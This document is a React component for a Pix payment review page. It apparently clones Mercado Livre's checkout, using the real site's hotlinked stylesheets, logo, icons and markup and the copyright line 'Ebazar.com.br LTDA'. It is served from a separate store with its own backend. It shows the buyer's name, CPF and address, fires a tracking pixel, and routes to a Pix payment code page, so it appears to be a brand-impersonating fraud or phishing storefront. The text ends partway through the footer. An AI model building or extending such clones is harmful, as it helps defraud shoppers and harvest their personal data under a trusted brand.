import React, { useEffect, useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { useStore } from "@/contexts/StoreContext";
import { supabase } from "@/integrations/supabase/client";
import { formatCurrencyParts } from "@/utils/formatters";
import { buildCustomerFields, loadCheckoutAddress, markOrderSaved, clearSavedOrder } from "@/utils/orderBuilder";
import { getCheckoutShipping, type CheckoutShipping } from "@/utils/checkoutShipping";
import { useTracking } from "@/contexts/TrackingContext";

const StoreCheckoutPaymentPix = () => {
    const navigate = useNavigate();
    const { cartItems, cartTotal, createOrder } = useStore();
    const { trackEvent } = useTracking();
    const initiateCheckoutFiredRef = useRef(false);

    const [addressData, setAddressData] = useState<any>(null);
    const [deliveryDays, setDeliveryDays] = useState({ min: 2, max: 5 });
    const [confirmState, setConfirmState] = useState<'idle' | 'loading' | 'rejected'>('idle');
    const [showStickyFooter, setShowStickyFooter] = useState(false);
    const [isScrolled, setIsScrolled] = useState(false);
    const inlineBtnRef = useRef<HTMLButtonElement>(null);
    const [isFreeShipping, setIsFreeShipping] = useState(false);
    const [selectedShipping] = useState<CheckoutShipping | null>(() => getCheckoutShipping());
    const shippingCost = selectedShipping && !selectedShipping.isFree ? selectedShipping.price : 0;
    const grandTotal = cartTotal + shippingCost;

    useEffect(() => {
        if (cartItems.length === 0) {
            navigate("/store/cart", { replace: true });
            return;
        }

        const savedAddr = localStorage.getItem('checkout_address');
        if (savedAddr) try { setAddressData(JSON.parse(savedAddr)); } catch (e) { }

        const fetchDelivery = async () => {
            const { data } = await supabase.from("settings").select("*").eq("key", "delivery_settings").maybeSingle();
            if (data?.value) {
                const v = data.value as any;
                setDeliveryDays({ min: v.delivery_days_min || 2, max: v.delivery_days_max || 5 });
                setIsFreeShipping(v.is_free_shipping ?? false);
            }
        };
        fetchDelivery();
    }, [cartItems, navigate]);

    useEffect(() => {
        window.scrollTo(0, 0);
        document.body.setAttribute("data-site", "MLB");
        document.body.setAttribute("data-country", "BR");
        return () => {
            document.body.removeAttribute("data-site");
            document.body.removeAttribute("data-country");
        }
    }, []);

    // Pixel: InitiateCheckout (finalizando) when user lands on the PIX payment page
    useEffect(() => {
        if (initiateCheckoutFiredRef.current || cartItems.length === 0) return;
        initiateCheckoutFiredRef.current = true;
        trackEvent("initiate_checkout", {
            value: grandTotal,
            currency: "BRL",
            content_type: "product",
            num_items: cartItems.reduce((n, i) => n + (i.quantity || 1), 0),
            contents: cartItems.map(i => ({
                id: i.product.id,
                product_id: i.product.id,
                quantity: i.quantity,
                item_price: i.product.price,
            })),
            content_ids: cartItems.map(i => i.product.id),
        });
    }, [cartItems, grandTotal, trackEvent]);

    useEffect(() => {
        const btn = inlineBtnRef.current;
        if (!btn) return;
        const observer = new IntersectionObserver(
            ([entry]) => setShowStickyFooter(!entry.isIntersecting),
            { threshold: 0, rootMargin: '0px' }
        );
        observer.observe(btn);
        return () => observer.disconnect();
    }, []);

    useEffect(() => {
        const onScroll = () => setIsScrolled(window.scrollY > 50);
        window.addEventListener('scroll', onScroll, { passive: true });
        return () => window.removeEventListener('scroll', onScroll);
    }, []);

    const valFmt = formatCurrencyParts(cartTotal);
    const totalFmt = formatCurrencyParts(grandTotal);
    const shippingFmt = formatCurrencyParts(shippingCost);

    const getDeliveryDate = (days: number) => {
        const d = new Date();
        let added = 0;
        while (added < days) {
            d.setDate(d.getDate() + 1);
            if (d.getDay() !== 0 && d.getDay() !== 6) added++;
        }
        const day = String(d.getDate()).padStart(2, '0');
        const month = d.toLocaleString('pt-BR', { month: 'short' }).replace('.', '');
        return `${day} ${month}`;
    };

    const handleConfirm = async () => {
        if (confirmState !== 'idle') return;
        setConfirmState('loading');

        // Salva o ID do produto e valor para consumo na página de sucesso
        if (cartItems.length > 0) {
            sessionStorage.setItem('last_pix_product_id', cartItems[0].product.id);
            sessionStorage.setItem('last_order_total', grandTotal.toString());
        }

        sessionStorage.removeItem('reserved_pix_code');
        sessionStorage.removeItem('reserved_pix_id');

        // Navega suavemente para a geração do Pix
        setTimeout(() => {
            navigate("/store/checkout/pix/success");
        }, 600);
    };

    return (
        <div data-site="MLB" data-country="BR" style={{ width: '100vw', margin: 0, padding: 0 }}>
            <style>
                {`
                a#nav-skip-to-main-content {
                    display: none !important;
                } 
                a#nav-a11y-feedback-link {
                    display: none !important;
                }
                @media screen and (max-width: 767px) {
                    main#root-app, main#root-app > div, #review_main_container, .bf-ui-core-container {
                        width: 100% !important;
                        max-width: 100vw !important;
                        min-width: 0 !important;
                        box-sizing: border-box !important;
                    }
                    body, html {
                        overflow-x: hidden !important;
                        min-width: auto !important;
                    }
                    #review_step_container {
                        display: flex;
                        flex-direction: column;
                        margin: 0 !important;
                        padding: 0 !important;
                        width: 100% !important;
                        max-width: 100vw !important;
                        box-sizing: border-box !important;
                    }
                    div#review_header_main_container {
                        order: 1;
                        background: #fff !important;
                        width: 100% !important;
                    }
                    div#resumo_da_compra_container {
                        order: 2;
                        margin-bottom: 24px;
                        width: 100% !important;
                        box-sizing: border-box !important;
                    }
                    div#review_resume_main_container {
                        order: 3;
                        padding: 16px !important;
                        width: 100% !important;
                        box-sizing: border-box !important;
                    }
                    h1.andes-typography.andes-typography--type-title.andes-typography--size-m.andes-typography--color-primary.andes-typography--weight-semibold {
                        margin-left: 16px;
                    }
                    .bf-core-header {
                        display: flex !important;
                        background: #fff !important;
                        margin: 0 !important;
                    }
                    header#mobile-header {
                        border: none !important;
                        box-shadow: none !important;
                        transition: background 0.3s ease, box-shadow 0.3s ease;
                    }
                    header#mobile-header.header-scrolled {
                        background: #ffe600 !important;
                        box-shadow: 0 2px 8px rgba(255, 230, 0, 0.5) !important;
                    }
                    header#mobile-header.header-scrolled .bf-core-header__title--visible {
                        color: rgba(0, 0, 0, 0.9) !important;
                    }
                }
                @media screen and (min-width: 768px) {
                    .mobile-only-block {
                        display: none !important;
                    }
                    div#review_resume_main_container {
                        margin-top: -261px !important;
                    }
                    .bf-ui-core-container.bf-ui-core-container--flex.bf-ui-core-container--flex-direction--row.bf-ui-core-container--flex-align--top.bf-ui-core-container--flex-text_align--left.bf-ui-core-container--flex-justify--between.bf-ui-core-container--flex-height--wrap_content.bf-ui-core-container--flex-width--match_parent.bf-ui-core-container--flex-wrap--no-wrap.bf-ui-core-container--margin--top-spacing4.bf-ui-core-container--margin--bottom-spacing4.bf-ui-core-container--margin--left-spacing4.bf-ui-core-container--margin--right-spacing4 {
                        margin: 0 !important;
                    }
                }

                /* === Confirm button states === */
                @keyframes btn-shimmer {
                    0%   { transform: translateX(-100%); }
                    100% { transform: translateX(250%); }
                }
                @keyframes dot-pulse {
                    0%, 60%, 100% { opacity: 0.2; transform: scale(0.8); }
                    30%           { opacity: 1;   transform: scale(1); }
                }
                .confirm-btn-wrap {
                    display: flex;
                    justify-content: center;
                    width: 100%;
                }
                /* Base */
                .confirm-btn {
                    position: relative;
                    width: 100% !important;
                    height: 48px;
                    overflow: hidden;
                    cursor: pointer;
                    transition:
                        width 0.55s cubic-bezier(0.4, 0, 0.2, 1),
                        border-radius 0.55s cubic-bezier(0.4, 0, 0.2, 1),
                        background-color 0.3s ease;
                }
                /* ── LOADING: shimmer sweep sobre o botão azul, texto dim ── */
                .confirm-btn--loading {
                    pointer-events: none;
                    width: 100% !important;
                }
                /* listra de brilho animada */
                .confirm-btn--loading::before {
                    content: '';
                    position: absolute;
                    top: 0; left: 0;
                    width: 40%;
                    height: 100%;
                    background: linear-gradient(
                        105deg,
                        transparent 20%,
                        rgba(255,255,255,0.28) 50%,
                        transparent 80%
                    );
                    animation: btn-shimmer 1.1s ease-in-out infinite;
                    z-index: 1;
                    pointer-events: none;
                }
                /* texto fica visível mas levemente dim */
                .confirm-btn--loading .btn-text {
                    opacity: 0.55;
                    transition: opacity 0.25s ease;
                }
                .confirm-btn--loading .btn-dots { display: none !important; }
                /* ── REJECTED: encolhe para bola verde ── */
                .confirm-btn--rejected {
                    width: 48px !important;
                    border-radius: 50% !important;
                    background-color: #00a650 !important;
                    pointer-events: none;
                }
                .confirm-btn--rejected .btn-text { opacity: 0; }
                .confirm-btn--rejected .btn-dots { display: flex !important; }
                /* Texto */
                .btn-text {
                    transition: opacity 0.25s ease;
                    white-space: nowrap;
                    position: relative;
                    z-index: 2;
                }
                /* Dots */
                .btn-dots {
                    display: none;
                    position: absolute;
                    top: 50%; left: 50%;
                    transform: translate(-50%, -50%);
                    gap: 5px;
                    align-items: center;
                }
                .btn-dots span {
                    display: block;
                    width: 5px; height: 5px;
                    background: #fff;
                    border-radius: 50%;
                    animation: dot-pulse 0.9s ease-in-out infinite;
                }
                .btn-dots span:nth-child(2) { animation-delay: 0.15s; }
                .btn-dots span:nth-child(3) { animation-delay: 0.30s; }
                .confirm-btn .andes-button__content {
                    display: flex; align-items: center; justify-content: center;
                    height: 100%; position: relative; z-index: 2;
                }
                /* Mobile sticky footer: oculto por padrão, exibido via JS */
                #review_footer_container {
                    transform: translateY(100%);
                    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
                }
                #review_footer_container.footer-visible {
                    transform: translateY(0);
                }
                `}
            </style>
            <link rel="stylesheet" href="https://http2.mlstatic.com/frontend-assets/buyingflow-review-frontend/index.desktop.7d2d8933.css" />
            <link rel="stylesheet" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/widgets/6.15.0/modeless-box.css" />
            <link rel="stylesheet" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.15.0/mercadolibre/navigation-desktop.css" />

            <header role="banner" data-siteid="MLB" className="nav-header nav-header-pluslite ui-navigation-v2">
                <div className="nav-bounds">
                    <div className="nav-header-logo">
                        <a id="nav-skip-to-main-content" className="nav-skip-to-main-content">
                            <span className="nav-skip-to-main-content__content">Ir para o conteúdo principal</span>
                        </a>
                        <a id="nav-a11y-feedback-link" className="nav-a11y-feedback-link">
                            <span className="nav-a11y-feedback-link__content">Acessibilidade</span>
                        </a>
                        
          
          <a className="nav-logo" style={{ backgroundImage: "url('https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/pt_logo_large_plus@2x.webp')", backgroundSize: "134px 34px", backgroundRepeat: "no-repeat" }}>
                            Mercado Livre
                        </a>
                    </div>
                </div>
            </header>

            <main role="main" id="root-app">
                <div id="review_main_container"
                    className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--flex-align--left bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--between bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap"
                    aria-hidden="false" data-js="container" data-id="review_main_container" data-testid="review_main_container">

                    <div id="review_step_container"
                        className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap"
                        aria-hidden="false" data-js="container" data-id="review_step_container"
                        data-testid="review_step_container">


                        <div id="review_header_main_container"
                            className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap bf-ui-core-container--background-white"
                            aria-hidden="false" data-js="container" data-id="review_header_main_container"
                            data-testid="review_header_main_container">

                            <header id="mobile-header" data-js="mobile-header" data-testid="mobile-header" className={`bf-core-header bf-core-header--yellow${isScrolled ? ' header-scrolled' : ''}`}>
                                <div className="bf-core-header__container bf-core-header__container--yellow">
                                    <button type="button" onClick={() => navigate(-1)} className="bf-core-header__button bf-core-icon-custom-size">
                                        <span className="andes-visually-hidden">Voltar</span>
                                        <span className="bf-ui-core-rich-text__icon" data-testid="undefined-0" id="undefined-0" aria-hidden="true" role="presentation">
                                            <img className="bf-ui-core-rich-text__icon--image" src="https://http2.mlstatic.com/storage/buyingflow-core-assets-web/bf-assets/svg/bf_v6_left_arrow_black.svg" alt="" />
                                        </span>
                                    </button>
                                    <h1 className="bf-core-header__title--visible">Revise e confirme a sua compra</h1>
                                </div>
                            </header>

                            <div id="review_header_title_container" className="bf-ui-core-label bf-ui-core-label--margin--bottom-spacing20 bf-ui-core-label--padding--left-spacing20 bf-ui-core-label--padding--right-spacing20">
                                <div className="bf-ui-core-rich-text__title bf-ui-core-rich-text__title--titlem">
                                    <h1 className="andes-typography andes-typography--type-title andes-typography--size-m andes-typography--color-primary andes-typography--weight-semibold">
                                        Revise e confirme a sua compra
                                    </h1>
                                </div>
                            </div>
                        </div>

                        <div id="review_resume_main_container"
                            className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--flex-align--stretch bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap bf-ui-core-container--padding--bottom-spacing20 bf-ui-core-container--padding--left-spacing20 bf-ui-core-container--padding--right-spacing20"
                            aria-hidden="false" data-js="container" data-id="review_resume_main_container"
                            style={{ marginTop: '-20px' }}
                            data-testid="review_resume_main_container">

                            {/* FATURAMENTO */}
                            <span className="bf-ui-core-label bf-ui-core-label--margin--top-spacing12 bf-ui-core-label--margin--bottom-spacing16" role="presentation">
                                <div className="bf-ui-core-rich-text__title bf-ui-core-rich-text__title--titlexs">
                                    <h2 className="andes-typography andes-typography--type-title andes-typography--size-xs andes-typography--color-primary andes-typography--weight-semibold">
                                        Faturamento
                                    </h2>
                                </div>
                            </span>
                            <div className="andes-card bf-ui-core-card bf-ui-core-card--margin--bottom-spacing12 andes-card--flat andes-card--padding-16">
                                <div className="andes-card__content bf-ui-core-card__content bf-ui-core-card__content--flex bf-ui-core-card__content--flex-direction--column">
                                    <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--top">
                                        <div className="andes-thumbnail-container">
                                            <div className="andes-thumbnail andes-thumbnail--circle andes-thumbnail--40 bf-ui-core-thumbnail">
                                                <img aria-hidden="true" alt="" src="https://http2.mlstatic.com/storage/buyingflow-core-assets-web/bf-assets/svg/bf_v6_bill.svg" />
                                            </div>
                                        </div>
                                        <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--margin--left-spacing16">
                                            <span className="bf-ui-core-label">
                                                <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--semibold bf-ui-core-rich-text__body--bodys">
                                                    <span className="andes-typography andes-typography--type-body andes-typography--size-s andes-typography--color-primary andes-typography--weight-semibold">{addressData?.name || "Comprador"}</span>
                                                </span>
                                            </span>
                                            <span className="bf-ui-core-label bf-ui-core-label--margin--top-spacing4">
                                                <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodys">
                                                    <span className="andes-typography andes-typography--type-body andes-typography--size-s andes-typography--color-primary andes-typography--weight-regular">
                                                        {addressData?.doc_type || 'CPF'}: {addressData?.document || addressData?.cpf || addressData?.doc_number || '—'}
                                                    </span>
                                                </span>
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            {/* DETALHE DA ENTREGA */}
                            <span className="bf-ui-core-label bf-ui-core-label--margin--top-spacing12 bf-ui-core-label--margin--bottom-spacing16" role="presentation">
                                <div className="bf-ui-core-rich-text__title bf-ui-core-rich-text__title--titlexs">
                                    <h2 className="andes-typography andes-typography--type-title andes-typography--size-xs andes-typography--color-primary andes-typography--weight-semibold">
                                        Detalhe da entrega
                                    </h2>
                                </div>
                            </span>
                            <div className="andes-card bf-ui-core-card bf-ui-core-card--margin--bottom-spacing12 andes-card--flat andes-card--padding-16">
                                <div className="andes-card__content bf-ui-core-card__content bf-ui-core-card__content--flex bf-ui-core-card__content--flex-direction--column">
                                    <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--top">
                                        <div className="andes-thumbnail-container">
                                            <div className="andes-thumbnail andes-thumbnail--circle andes-thumbnail--40 bf-ui-core-thumbnail">
                                                <img aria-hidden="true" alt="" src="https://http2.mlstatic.com/storage/buyingflow-core-assets-web/bf-assets/svg/bf_v6_gps_pin.svg" />
                                            </div>
                                        </div>
                                        <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--margin--left-spacing16">
                                            <span className="bf-ui-core-label">
                                                <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--semibold bf-ui-core-rich-text__body--bodys">
                                                    <span className="andes-typography andes-typography--type-body andes-typography--size-s andes-typography--color-primary andes-typography--weight-semibold">{addressData ? `${addressData.streetName} ${addressData.streetNumber}`.trim() : "Endereço"}</span>
                                                </span>
                                            </span>
                                            <span className="bf-ui-core-label bf-ui-core-label--margin--top-spacing4">
                                                <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodys">
                                                    <span className="andes-typography andes-typography--type-body andes-typography--size-s andes-typography--color-primary andes-typography--weight-regular">Entrega no meu endereço</span>
                                                </span>
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            {/* PRODUTO */}
                            <div className="andes-card bf-ui-core-card bf-ui-core-card--margin--bottom-spacing12 andes-card--flat andes-card--padding-16">
                                <div className="andes-card__content bf-ui-core-card__content bf-ui-core-card__content--flex bf-ui-core-card__content--flex-direction--column">
                                    <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--top">
                                        <div className="andes-thumbnail-multiple andes-thumbnail-multiple--stacked andes-thumbnail-multiple--stacked-40 bf-ui-core-thumbnail-multiple">
                                            {cartItems.map((item, idx) => (
                                                <div key={item.product.id + idx} className="andes-thumbnail-container">
                                                    <div className="andes-thumbnail andes-thumbnail--circle andes-thumbnail--40 bf-ui-core-thumbnail">
                                                        <img aria-hidden="true" alt={item.product.name} src={item.product.image} />
                                                    </div>
                                                </div>
                                            ))}
                                        </div>
                                        <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--margin--left-spacing16">
                                            <span className="bf-ui-core-label">
                                                <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--semibold bf-ui-core-rich-text__body--bodys">
                                                    <span className="andes-typography andes-typography--type-body andes-typography--size-s andes-typography--color-primary andes-typography--weight-semibold">Chegará entre {getDeliveryDate(deliveryDays.min)} e {getDeliveryDate(deliveryDays.max)}</span>
                                                </span>
                                            </span>
                                            <span className="bf-ui-core-label bf-ui-core-label--margin--top-spacing4">
                                                <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodys">
                                                    <span className="andes-typography andes-typography--type-body andes-typography--size-s andes-typography--color-primary andes-typography--weight-regular">{cartItems[0]?.product.name || "Produto"} - Quantidade: {cartItems[0]?.quantity || 1}</span>
                                                </span>
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            {/* DETALHE DO PAGAMENTO (Pix) */}
                            <span className="bf-ui-core-label bf-ui-core-label--margin--top-spacing12 bf-ui-core-label--margin--bottom-spacing16" role="presentation">
                                <div className="bf-ui-core-rich-text__title bf-ui-core-rich-text__title--titlexs">
                                    <h2 className="andes-typography andes-typography--type-title andes-typography--size-xs andes-typography--color-primary andes-typography--weight-semibold">Detalhe do pagamento</h2>
                                </div>
                            </span>
                            <div className="andes-card bf-ui-core-card bf-ui-core-card--margin--bottom-spacing12 andes-card--flat andes-card--padding-16">
                                <div className="andes-card__content bf-ui-core-card__content bf-ui-core-card__content--flex bf-ui-core-card__content--flex-direction--column">
                                    <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--top">
                                        <div className="andes-thumbnail-container">
                                            <div className="andes-thumbnail andes-thumbnail--circle andes-thumbnail--40 bf-ui-core-thumbnail">
                                                <img aria-hidden="true" alt="" src="https://http2.mlstatic.com/storage/buyingflow-core-assets-web/bf-assets/svg/bf_v6_pix.svg" />
                                            </div>
                                        </div>
                                        <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--margin--left-spacing16">
                                            <span className="bf-ui-core-label">
                                                <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--semibold bf-ui-core-rich-text__body--bodys">
                                                    <span className="andes-typography andes-typography--type-body andes-typography--size-s andes-typography--color-primary andes-typography--weight-semibold">Pix</span>
                                                </span>
                                            </span>
                                            <span className="bf-ui-core-label bf-ui-core-label--margin--top-spacing4">
                                                <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodys">
                                                    <span className="andes-typography andes-typography--type-body andes-typography--size-s andes-typography--color-primary andes-typography--weight-regular">À vista</span>
                                                </span>
                                            </span>
                                        </div>
                                    </div>
                                </div>
                                <div className="andes-card__footer andes-card__footer--border">
                                    <span className="bf-ui-core-rich-text__link">
                                        <a className="andes-typography andes-typography--type-body andes-typography--size-xs andes-typography--color-link andes-typography--weight-regular" onClick={() => navigate("/store/checkout/payments")}>Alterar forma de pagamento</a>
                                    </span>
                                </div>
                            </div>
                        </div>

                        {/* RESUMO DA COMPRA */}
                        <div id="resumo_da_compra_container" className="andes-card bf-ui-core-card andes-card--flat andes-card--padding-24">
                            <div className="andes-card__header andes-card__header--border">
                                <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--semibold bf-ui-core-rich-text__body--bodym">
                                    <span className="andes-typography andes-typography--type-body andes-typography--size-m andes-typography--color-primary andes-typography--weight-semibold">Resumo da compra</span>
                                </span>
                            </div>
                            <div className="andes-card__content">

                                <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-justify--between bf-ui-core-container--margin--top-spacing4 bf-ui-core-container--margin--bottom-spacing4">
                                    <span className="bf-ui-core-label">
                                        <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodym">
                                            <span className="andes-typography andes-typography--type-body andes-typography--size-m andes-typography--color-primary andes-typography--weight-regular">Produto</span>
                                        </span>
                                    </span>
                                    <span className="bf-ui-core-label">
                                        <span className="bf-ui-core-rich-text__price bf-ui-core-rich-text__price--primary">
                                            <span className="andes-money-amount andes-money-amount--cents-superscript" style={{ fontSize: '16px' }}>
                                                <span className="andes-money-amount__currency-symbol">R$</span>
                                                <span className="andes-money-amount__fraction">{valFmt.integer}</span>
                                                <span className="andes-visually-hidden">,</span>
                                                <span className="andes-money-amount__cents andes-money-amount__cents--superscript-16" style={{ fontSize: '10px', marginTop: '2px' }}>{valFmt.cents}</span>
                                            </span>
                                        </span>
                                    </span>
                                </div>

                                <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-justify--between bf-ui-core-container--margin--top-spacing8">
                                    <span className="bf-ui-core-label">
                                        <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodym">
                                            <span className="andes-typography andes-typography--type-body andes-typography--size-m andes-typography--color-primary andes-typography--weight-regular">Envio</span>
                                        </span>
                                    </span>
                                    <span className="bf-ui-core-label">
                                        <span className="bf-ui-core-rich-text__price bf-ui-core-rich-text__price--positive">
                                            {selectedShipping && !selectedShipping.isFree ? (
                                                <span className="andes-money-amount andes-money-amount--cents-superscript" style={{ fontSize: '16px' }}>
                                                    <span className="andes-money-amount__currency-symbol">{shippingFmt.symbol}</span>
                                                    <span className="andes-money-amount__fraction">{shippingFmt.integer}</span>
                                                    <span className="andes-visually-hidden">,</span>
                                                    <span className="andes-money-amount__cents andes-money-amount__cents--superscript-16" style={{ fontSize: '10px', marginTop: '2px' }}>{shippingFmt.cents}</span>
                                                </span>
                                            ) : (isFreeShipping || selectedShipping?.isFree) ? (
                                                <span className="andes-typography andes-typography--type-body andes-typography--size-m andes-typography--color-positive andes-typography--weight-regular">Grátis</span>
                                            ) : (
                                                <span className="andes-typography andes-typography--type-body andes-typography--size-m andes-typography--color-primary andes-typography--weight-regular">—</span>
                                            )}
                                        </span>
                                    </span>
                                </div>

                                <hr className="bf-ui-core-separator bf-ui-core-separator--margin--top-spacing16 bf-ui-core-separator--margin--bottom-spacing16 bf-ui-core-separator--background-gray100 bf-ui-core-separator--height-spacing1" />

                                <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-justify--between bf-ui-core-container--margin--top-spacing4">
                                    <span className="bf-ui-core-label">
                                        <div className="bf-ui-core-rich-text__title bf-ui-core-rich-text__title--titles">
                                            <span className="andes-typography andes-typography--type-title andes-typography--size-s andes-typography--color-primary andes-typography--weight-semibold">Você pagará</span>
                                        </div>
                                    </span>
                                    <span className="bf-ui-core-label">
                                        <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--baseline">
                                            <span className="bf-ui-core-rich-text__price bf-ui-core-rich-text__price--primary">
                                                <span className="andes-money-amount andes-money-amount--cents-superscript andes-money-amount--weight-semibold" style={{ fontSize: '20px' }}>
                                                    <span className="andes-money-amount__currency-symbol">{totalFmt.symbol}</span>
                                                    <span className="andes-money-amount__fraction">{totalFmt.integer}</span>
                                                    <span className="andes-visually-hidden">,</span>
                                                    <span className="andes-money-amount__cents andes-money-amount__cents--superscript-20" style={{ fontSize: '10px', marginTop: '4px' }}>{totalFmt.cents}</span>
                                                </span>
                                            </span>
                                        </div>
                                    </span>
                                </div>

                                <div className="bf-ui-core-container bf-ui-core-container--margin--top-spacing24 confirm-btn-wrap">
                                    <button
                                        ref={inlineBtnRef}
                                        type="button"
                                        onClick={handleConfirm}
                                        disabled={confirmState !== 'idle'}
                                        className={`andes-button bf-ui-core-button bf-ui-core-button__simple bf-ui-core-button__hierarchy--loud bf-ui-core-button__size--large andes-button--large andes-button--loud confirm-btn${confirmState === 'loading' ? ' confirm-btn--loading' : ''}${confirmState === 'rejected' ? ' confirm-btn--rejected' : ''}`}>
                                        <span className="andes-button__content">
                                            <span className="btn-text">Confirmar a compra</span>
                                        </span>
                                        <span className="btn-dots">
                                            <span /><span /><span />
                                        </span>
                                    </button>
                                </div>
                            </div>
                        </div>

                    </div>
                </div>
            </main>

            {/* MOBILE STICKY FOOTER */}
            <footer
                id="review_footer_container"
                className={`mobile-only-block bf-ui-core-footer bf-ui-core-footer--padding--top-spacing16 bf-ui-core-footer--padding--bottom-spacing24 bf-ui-core-footer--padding--left-spacing20 bf-ui-core-footer--padding--right-spacing20${showStickyFooter ? ' footer-visible' : ''}`}
                style={{ position: 'fixed', bottom: 0, left: 0, right: 0, backgroundColor: '#fff', zIndex: 100, borderTop: '1px solid #e1e1e1' }}
                data-js="footer" data-id="review_footer_container" data-testid="review_footer_container">
                <div id="review_footer_total_container" className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-justify--between bf-ui-core-container--margin--top-spacing4">
                    <span className="bf-ui-core-label">
                        <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--semibold bf-ui-core-rich-text__body--bodyl">
                            <span className="andes-typography andes-typography--type-body andes-typography--size-l andes-typography--color-primary andes-typography--weight-semibold">Total</span>
                        </span>
                    </span>
                    <span className="bf-ui-core-label">
                        <span className="bf-ui-core-rich-text__price bf-ui-core-rich-text__price--primary">
                            <span className="andes-money-amount andes-money-amount--cents-superscript andes-money-amount--weight-semibold" style={{ fontSize: '18px' }}>
                                <span className="andes-money-amount__currency-symbol">{totalFmt.symbol}</span>
                                <span className="andes-money-amount__fraction">{totalFmt.integer}</span>
                                <span className="andes-visually-hidden">,</span>
                                <span className="andes-money-amount__cents andes-money-amount__cents--superscript-18" style={{ fontSize: '10px', marginTop: '3px' }}>{totalFmt.cents}</span>
                            </span>
                        </span>
                    </span>
                </div>
                <div className="confirm-btn-wrap" style={{ marginTop: '16px' }}>
                    <button type="button" onClick={handleConfirm} disabled={confirmState !== 'idle'}
                        className={`andes-button bf-ui-core-button bf-ui-core-button__simple bf-ui-core-button__hierarchy--loud bf-ui-core-button__size--large andes-button--large andes-button--loud confirm-btn${confirmState === 'loading' ? ' confirm-btn--loading' : ''}${confirmState === 'rejected' ? ' confirm-btn--rejected' : ''}`}
                        id="review_footer_confirm_button">
                        <span className="andes-button__content">
                            <span className="btn-text">Confirmar a compra</span>
                        </span>
                        <span className="btn-dots">
                            <span /><span /><span />
                        </span>
                    </button>
                </div>
            </footer>

            <footer role="contentinfo" className="nav-footer" style={{ marginTop: '32px', paddingBottom: '90px' }}>
                <div className="nav-footer-user-info nav-bounds">
                    <div className="nav-footer-info-wrapper">
                        <div className="nav-footer-primaryinfo">
                            <small className="nav-footer-copyright">Copyright © 1999-2024 Ebazar.com.br LTDA.</small>
                        </div>
